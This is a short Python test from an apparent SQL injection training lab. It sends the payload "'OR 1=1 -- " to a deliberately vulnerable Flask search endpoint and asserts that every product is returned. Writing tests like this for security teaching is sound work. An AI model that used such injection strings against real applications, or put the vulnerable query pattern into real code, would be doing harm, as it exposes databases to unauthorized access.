from labs.sql_injection.vulnerable.app import app

def test_sql_injection_returns_all_products():
    app.config["TESTING"] = True

    with app.test_client() as client:
        response = client.get(
            "/search",
            query_string={"name": "'OR 1=1 -- ",}
        )

    assert response.status_code == 200
    assert sorted(response.get_json()["products"]) == [
        [1, "Keyboard"],
        [2, "Mouse"],
        [3, "Monitor"],
    ]
